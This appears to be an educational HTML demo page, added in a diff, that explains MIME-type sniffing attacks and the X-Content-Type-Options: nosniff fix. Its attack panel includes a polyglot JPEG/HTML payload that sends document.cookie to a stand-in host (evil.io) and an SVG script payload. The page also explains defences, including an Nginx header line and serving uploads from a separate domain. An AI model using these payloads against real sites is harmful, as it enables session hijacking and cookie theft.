@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>MIME Sniffing — Missing X-Content-Type-Options</title>
+  <style>
+    :root { --dark:#1a1a2e; --card:#16213e; --red:#e74c3c; --green:#27ae60; --text:#eaeaea; --muted:#8899aa; }
+    * { box-sizing:border-box; margin:0; padding:0; }
+    body { font-family:'Segoe UI',system-ui,sans-serif; background:var(--dark); color:var(--text); line-height:1.6; }
+    header { background:linear-gradient(135deg,#1a3a1a,#1e6b1e); padding:2rem; border-bottom:3px solid #27ae60; }
+    header h1 { font-size:1.8rem; }
+    header .sub { color:#c9ffcc; font-size:0.9rem; margin-top:0.3rem; }
+    nav { padding:0.7rem 2rem; background:#0f1f3a; font-size:0.85rem; }
+    nav a { color:#aac4ff; text-decoration:none; }
+    main { max-width:860px; margin:2rem auto; padding:0 1.5rem; display:flex; flex-direction:column; gap:2rem; }
+    .panel { background:var(--card); border:1px solid #2a3a5c; border-radius:10px; padding:1.5rem; }
+    .panel.attack { border-left:4px solid var(--red); }
+    .panel.fix    { border-left:4px solid var(--green); }
+    .panel h2 { font-size:1.1rem; margin-bottom:1rem; }
+    .panel.attack h2 { color:var(--red); }
+    .panel.fix h2    { color:var(--green); }
+    p { font-size:0.92rem; color:var(--muted); margin-bottom:0.8rem; }
+    code, pre { font-family:'Fira Code',monospace; font-size:0.85rem; background:#0f1f3a; color:#82c4f8; }
+    pre { padding:1rem; border-radius:6px; overflow-x:auto; border:1px solid #1e3a5a; margin:0.8rem 0; }
+    code { padding:0.1rem 0.4rem; border-radius:3px; }
+    ol,ul { padding-left:1.5rem; }
+    ol li, ul li { font-size:0.88rem; color:var(--muted); margin-bottom:0.5rem; }
+    .step-num { display:inline-block; background:var(--red); color:#fff; width:1.4rem; height:1.4rem; border-radius:50%; text-align:center; line-height:1.4rem; font-size:0.75rem; font-weight:700; margin-right:0.5rem; }
+    .header-block { background:#0b1629; border:1px solid var(--green); border-radius:6px; padding:1rem; font-family:monospace; font-size:0.85rem; color:#82f8a4; margin:0.8rem 0; }
+    .demo-area { background:#0b1629; border:1px dashed #4a6fa5; border-radius:6px; padding:1rem; margin-top:1rem; }
+    .demo-area p { font-size:0.85rem; }
+    .tag-table { width:100%; border-collapse:collapse; margin:0.8rem 0; font-size:0.85rem; }
+    .tag-table th { background:#0b1629; color:#aac4ff; padding:0.5rem 0.8rem; text-align:left; border:1px solid #2a3a5c; }
+    .tag-table td { padding:0.5rem 0.8rem; border:1px solid #2a3a5c; color:var(--muted); }
+    .tag-table tr:nth-child(even) td { background:#101e36; }
+    footer { text-align:center; margin:2rem 0 1rem; color:var(--muted); font-size:0.8rem; }
+  </style>
+</head>
+<body>
+<header>
+  <h1>🎭 MIME-Type Sniffing</h1>
+  <div class="sub">Missing header: <code style="background:rgba(0,0,0,0.3);padding:0.1rem 0.4rem;border-radius:3px">X-Content-Type-Options: nosniff</code></div>
+</header>
+<nav><a href="index.html">← Back to all demos</a></nav>
+
+<main>
+
+  <div class="panel">
+    <h2>📖 What is MIME Sniffing?</h2>
+    <p>Browsers try to be helpful: if a server sends a file with the wrong <code>Content-Type</code>, the browser "sniffs" the actual content and decides what type it really is. Internet Explorer introduced this behaviour; other browsers followed to maintain compatibility.</p>
+    <p>While useful in the early web, MIME sniffing becomes a security hole when user-uploaded files are served. An attacker can upload a file that <em>looks like an image</em> to the server (passes <code>.jpg</code> extension checks) but contains HTML/JavaScript that the browser will execute.</p>
+  </div>
+
+  <div class="panel attack">
+    <h2>🔴 The Attack — Polyglot File Upload</h2>
+    <p>A polyglot file is simultaneously a valid file of two types. A common example: a JPEG file that also contains a valid HTML page with an embedded script. The image passes the server's file-type check but the browser sniffs it as HTML and renders it.</p>
+    <p>Step-by-step scenario:</p>
+    <ol>
+      <li><span class="step-num">1</span>Target site allows profile picture uploads, validates the file extension (<code>.jpg</code>) and reads the first few bytes to confirm it is a JPEG.</li>
+      <li><span class="step-num">2</span>Attacker crafts a file whose first bytes are a valid JPEG header (<code>FF D8 FF</code>) followed by an HTML page:<br>
+        <pre>FF D8 FF E0 &lt;!-- valid JPEG magic bytes --&gt;
+&lt;!-- then immediately: --&gt;
+&lt;html&gt;&lt;body&gt;&lt;script&gt;
+  fetch('https://evil.io/steal?c=' + document.cookie);
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</pre>
+      </li>
+      <li><span class="step-num">3</span>Server stores the file and serves it as <code>image/jpeg</code>.</li>
+      <li><span class="step-num">4</span>Without <code>X-Content-Type-Options: nosniff</code>, the browser ignores the declared <code>image/jpeg</code> type, sniffs the HTML content, and <strong>renders it as a web page</strong>.</li>
+      <li><span class="step-num">5</span>The embedded script executes under the site's origin and steals session cookies.</li>
+    </ol>
+
+    <div class="demo-area">
+      <p><strong>Proof of concept:</strong> this server serves <code>/mime-demo.js</code> with <code>Content-Type: text/plain</code>. Without <code>nosniff</code>, older IE/Edge will execute it as JavaScript when included via a <code>&lt;script&gt;</code> tag. Modern Chrome/Firefox are already stricter for scripts, but the principle applies to HTML content and SVG files.</p>
+      <pre>&lt;!-- attacker embeds the "text" file as a script --&gt;
+&lt;script src="/mime-demo.js"&gt;&lt;/script&gt;
+&lt;!-- IE/old Edge sniffs it as JS and runs it despite text/plain --&gt;</pre>
+      <p>More dangerous with SVG: SVG files can contain <code>&lt;script&gt;</code> and are a common upload vector because they look like images.</p>
+      <pre>Content-Type: image/svg+xml
+Body: &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;/svg&gt;</pre>
+    </div>
+  </div>
+
+  <div class="panel attack">
+    <h2>🔴 At-Risk Content Types</h2>
+    <table class="tag-table">
+      <tr><th>Served As</th><th>Sniffed As</th><th>Risk</th></tr>
+      <tr><td>text/plain</td><td>text/html</td><td>Script execution if page-level HTML</td></tr>
+      <tr><td>image/jpeg</td><td>text/html</td><td>Polyglot JPEG/HTML executes scripts</td></tr>
+      <tr><td>image/svg+xml</td><td>image/svg+xml</td><td>SVG scripts execute natively</td></tr>
+      <tr><td>application/octet-stream</td><td>text/html</td><td>Browser renders binary as HTML</td></tr>
+      <tr><td>text/csv</td><td>text/html</td><td>Formula injection + sniffing → XSS</td></tr>
+    </table>
+  </div>
+
+  <div class="panel fix">
+    <h2>✅ The Fix — X-Content-Type-Options: nosniff</h2>
+    <p>This single header tells the browser: <em>"Trust the Content-Type I declare. Do not sniff."</em></p>
+    <div class="header-block">X-Content-Type-Options: nosniff</div>
+    <p>When set:</p>
+    <ul>
+      <li>Scripts are only loaded if served as <code>application/javascript</code> or <code>text/javascript</code>.</li>
+      <li>Stylesheets are only loaded if served as <code>text/css</code>.</li>
+      <li>All other content types are taken at face value.</li>
+    </ul>
+    <p>In Nginx:</p>
+    <pre>add_header X-Content-Type-Options "nosniff" always;</pre>
+    <p><strong>Also set correct Content-Types on uploads.</strong> Serve user-uploaded files from a <em>separate domain</em> (e.g. <code>static.example.com</code> with no cookies) so that even if something slips through, it cannot access session cookies for <code>app.example.com</code>.</p>
+  </div>
+
+</main>
+<footer>Educational demo — do not use in production.</footer>
+</body>
+</html>
